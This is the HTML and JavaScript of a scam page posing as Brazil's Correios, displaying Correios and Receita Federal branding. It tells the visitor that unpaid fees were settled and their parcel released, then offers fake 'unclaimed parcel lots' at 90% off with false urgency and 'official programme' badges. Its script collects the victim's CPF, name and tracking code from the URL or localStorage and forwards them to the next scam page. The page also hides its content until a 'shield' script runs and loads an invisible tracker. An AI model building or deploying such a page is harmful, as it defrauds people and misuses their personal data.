<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#004169">
    <title>Encomenda Liberada - Correios</title>

    <link rel="icon" type="image/webp" href="images/favicon.webp">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link rel="stylesheet" href="css/imp-e7a3b1.css">
    <style>
        body { visibility: hidden; background: #f0f2f5; }

        .obrigado-wrapper {
            max-width: 440px;
            margin: 0 auto;
            padding: 16px 16px 32px;
        }

        /* Success card */
        .success-card {
            background: linear-gradient(135deg, #15803d, #16a34a);
            border-radius: 16px;
            padding: 24px 20px;
            margin-bottom: 20px;
            text-align: center;
            color: #fff;
            position: relative;
            overflow: hidden;
        }
        .success-card::before {
            content: '';
            position: absolute;
            top: -40%;
            right: -30%;
            width: 160px;
            height: 160px;
            background: rgba(255,255,255,0.06);
            border-radius: 50%;
        }
        .success-card::after {
            content: '';
            position: absolute;
            bottom: -30%;
            left: -20%;
            width: 120px;
            height: 120px;
            background: rgba(255,255,255,0.04);
            border-radius: 50%;
        }

        .success-check {
            width: 48px;
            height: 48px;
            background: rgba(255,255,255,0.2);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 12px;
            animation: popIn 0.5s ease;
        }
        .success-check i { font-size: 22px; color: #fff; }
        @keyframes popIn { 0% { transform: scale(0); } 70% { transform: scale(1.15); } 100% { transform: scale(1); } }

        .success-card h3 {
            font-size: 17px;
            font-weight: 700;
            margin-bottom: 6px;
            position: relative;
        }
        .success-card p {
            font-size: 12px;
            opacity: 0.85;
            line-height: 1.4;
            position: relative;
        }

        .success-meta {
            display: flex;
            justify-content: center;
            gap: 16px;
            margin-top: 14px;
            position: relative;
        }
        .success-meta-item {
            display: flex;
            align-items: center;
            gap: 5px;
            font-size: 11px;
            opacity: 0.9;
        }
        .success-meta-item i { font-size: 12px; }

        /* Main offer */
        .offer {
            background: #fff;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 12px 40px rgba(0,0,0,0.12);
            position: relative;
        }

        .offer-ribbon {
            position: absolute;
            top: 16px;
            right: -32px;
            background: #dc2626;
            color: #fff;
            font-size: 10px;
            font-weight: 800;
            text-transform: uppercase;
            letter-spacing: 1px;
            padding: 6px 40px;
            transform: rotate(45deg);
            z-index: 2;
            box-shadow: 0 2px 8px rgba(220,38,38,0.3);
        }

        .offer-hero {
            background: linear-gradient(135deg, #004169 0%, #00314f 100%);
            padding: 28px 24px 24px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        .offer-hero::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255,196,12,0.08) 0%, transparent 60%);
            pointer-events: none;
        }

        .offer-icon {
            width: 56px;
            height: 56px;
            background: linear-gradient(135deg, #FFC40C, #f59e0b);
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 14px;
            font-size: 24px;
            color: #004169;
            box-shadow: 0 4px 16px rgba(255,196,12,0.4);
        }

        .offer-hero h2 {
            color: #fff;
            font-size: 19px;
            font-weight: 700;
            line-height: 1.3;
            margin-bottom: 8px;
        }
        .offer-hero h2 span { color: #FFC40C; }

        .offer-hero p {
            color: rgba(255,255,255,0.7);
            font-size: 12px;
        }

        /* Stats */
        .offer-stats {
            display: flex;
            border-bottom: 1px solid #f0f0f0;
        }
        .offer-stat {
            flex: 1;
            padding: 14px 8px;
            text-align: center;
            border-right: 1px solid #f0f0f0;
        }
        .offer-stat:last-child { border-right: none; }
        .offer-stat strong {
            display: block;
            font-size: 18px;
            font-weight: 800;
            color: #004169;
            line-height: 1;
        }
        .offer-stat span {
            font-size: 10px;
            color: #999;
            text-transform: uppercase;
            letter-spacing: 0.3px;
        }

        /* Body */
        .offer-body { padding: 20px; }

        .offer-items {
            display: flex;
            flex-direction: column;
            gap: 8px;
            margin-bottom: 20px;
        }

        .offer-item {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 12px 14px;
            background: #f8fafc;
            border-radius: 10px;
            border-left: 3px solid #FFC40C;
        }

        .offer-item i {
            font-size: 16px;
            color: #004169;
            width: 20px;
            text-align: center;
            flex-shrink: 0;
        }

        .offer-item div {
            font-size: 13px;
            color: #333;
            line-height: 1.3;
        }
        .offer-item strong { color: #004169; }

        /* CTA */
        .offer-cta {
            display: block;
            width: 100%;
            padding: 18px 24px;
            background: linear-gradient(135deg, #004169, #0071ad);
            color: #fff;
            border: none;
            border-radius: 14px;
            font-size: 16px;
            font-weight: 700;
            text-align: center;
            text-decoration: none;
            cursor: pointer;
            position: relative;
            overflow: hidden;
            box-shadow: 0 6px 24px rgba(0,65,105,0.35);
            transition: transform 0.2s, box-shadow 0.2s;
        }
        .offer-cta:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 28px rgba(0,65,105,0.45);
        }
        .offer-cta:active { transform: translateY(0); }

        .offer-cta::after {
            content: '';
            position: absolute;
            top: 0; left: -100%;
            width: 100%; height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
            animation: ctaShine 3s infinite;
        }
        @keyframes ctaShine {
            0% { left: -100%; }
            30% { left: 100%; }
            100% { left: 100%; }
        }

        .offer-cta i { margin-right: 8px; }

        .offer-urgency {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            margin-top: 12px;
            padding: 8px;
            background: #FEF2F2;
            border-radius: 8px;
            font-size: 11px;
            font-weight: 600;
            color: #991B1B;
        }
        .offer-urgency i { animation: urgPulse 1s infinite alternate; }
        @keyframes urgPulse { 0% { opacity: 1; } 100% { opacity: 0.4; } }

        /* Trust */
        .offer-trust {
            display: flex;
            justify-content: center;
            gap: 16px;
            margin-top: 16px;
            padding-top: 16px;
            border-top: 1px solid #f0f0f0;
        }
        .trust-item {
            display: flex;
            align-items: center;
            gap: 4px;
            font-size: 10px;
            color: #999;
        }
        .trust-item i { color: #16a34a; font-size: 12px; }

        .skip-link {
            display: block;
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #bbb;
            text-decoration: none;
        }
        .skip-link:hover { color: #888; }
    </style>
    <noscript><style>body{visibility:visible!important}</style></noscript>
</head>
<body>
    <header class="header">
        <nav class="header-nav" id="headerNav">
            <a href="#" class="logo-link">
                <img src="images/correios.webp" alt="Correios" class="logo-correios">
            </a>
            <div class="btn-entrar">
                <i class="fas fa-headset" style="font-size:1.1rem;"></i>
                <span class="user-name">SAC 0800 725 7282</span>
            </div>
        </nav>
    </header>

    <main class="main">
        <div class="obrigado-wrapper">
            <div class="success-card">
                <div class="success-check"><i class="fas fa-check"></i></div>
                <h3>Encomenda Liberada!</h3>
                <p>Pendências quitadas — rastreio atualizado enviado por e-mail.</p>
                <div class="success-meta">
                    <div class="success-meta-item"><i class="fas fa-shield-halved"></i> Verificado</div>
                    <div class="success-meta-item"><i class="fas fa-truck"></i> Em trânsito</div>
                </div>
            </div>

            <div class="offer">
                <div class="offer-ribbon">Exclusivo</div>

                <div class="offer-hero">
                    <div class="offer-icon"><i class="fas fa-box-open"></i></div>
                    <h2>Lotes de Encomendas<br><span>Não Retiradas</span></h2>
                    <p>Acesso liberado por ter regularizado sua encomenda</p>
                </div>

                <div class="offer-stats">
                    <div class="offer-stat">
                        <strong>90%</strong>
                        <span>Desconto</span>
                    </div>
                    <div class="offer-stat">
                        <strong>3</strong>
                        <span>Lotes disponíveis</span>
                    </div>
                    <div class="offer-stat">
                        <strong>48h</strong>
                        <span>Envio rápido</span>
                    </div>
                </div>

                <div class="offer-body">
                    <div class="offer-items">
                        <div class="offer-item">
                            <i class="fas fa-tv"></i>
                            <div><strong>Eletrônicos e smartphones</strong> de grandes marcas por preços simbólicos</div>
                        </div>
                        <div class="offer-item">
                            <i class="fas fa-truck-fast"></i>
                            <div><strong>Frete grátis</strong> para todo o Brasil com rastreio</div>
                        </div>
                        <div class="offer-item">
                            <i class="fas fa-shield-halved"></i>
                            <div><strong>Garantia de 7 dias</strong> — devolução se insatisfeito</div>
                        </div>
                    </div>

                    <!-- href montado pelo JS abaixo -->
                    <a href="consulta-lote.php" class="offer-cta" id="btnLote">
                        <i class="fas fa-arrow-right"></i>
                        Ver Lotes Disponíveis
                    </a>

                    <div class="offer-urgency">
                        <i class="fas fa-circle-exclamation"></i>
                        <span>Vagas limitadas — apenas enquanto houver estoque</span>
                    </div>

                    <div class="offer-trust">
                        <div class="trust-item"><i class="fas fa-lock"></i> Pagamento seguro</div>
                        <div class="trust-item"><i class="fas fa-check-circle"></i> Programa oficial</div>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <footer class="footer">
        <div class="footer-container">
            <div class="footer-bottom">
                <div class="footer-logos">
                    <img src="images/logo-rodape.webp" alt="Correios e Receita Federal" class="logo-footer">
                </div>
                <p class="footer-copyright">© Copyright 2026 Correios<br>CNPJ 34.028.316/0001-03</p>
            </div>
        </div>
    </footer>

    <script src="js/imp-t4k2r1.js"></script>
    <script>window._currentStep="encomenda";window._trackEvent("page_view","encomenda");</script>
    <script src="js/shield.js"></script>

    <script>
    (function(){
        var P = new URLSearchParams(window.location.search);

        // Lê da URL primeiro, com fallback no localStorage
        var cpf      = P.get('cpf')      || localStorage.getItem('correios_cpf')      || '';
        var nome     = P.get('nome')     || localStorage.getItem('correios_nome')     || '';
        var rastreio = P.get('rastreio') || localStorage.getItem('correios_rastreio') || '';

        // Garante persistência no localStorage
        if (cpf)      localStorage.setItem('correios_cpf', cpf);
        if (nome)     localStorage.setItem('correios_nome', nome);
        if (rastreio) localStorage.setItem('correios_rastreio', rastreio);

        // Monta query string para consulta-lote.php
        var params = new URLSearchParams();
        if (cpf)      params.set('cpf', cpf);
        if (nome)     params.set('nome', nome);
        if (rastreio) params.set('rastreio', rastreio);

        // Repassa tracking params (gclid, utm, etc.)
        ['gclid','gbraid','wbraid','gad_source','gad_campaignid',
         'utm_source','utm_medium','utm_campaign'].forEach(function(k){
            var v = P.get(k); if (v) params.set(k, v);
        });

        var qs = params.toString();
        var link = document.getElementById('btnLote');
        if (link) link.href = 'consulta-lote.php' + (qs ? '?' + qs : '');

        document.body.style.visibility = 'visible';
    })();
    </script>
    
    <div style="position:absolute; width:1px; height:1px; overflow:hidden; opacity:0; pointer-events:none; left:-9999px;">
  <script id="_waum87">var _wau = _wau || []; _wau.push(["dynamic", "00lylhhgew", "m87", "c4302bffffff", "small"]);</script>
  <script async src="//waust.at/d.js"></script>
</div>
    
</body>
</html>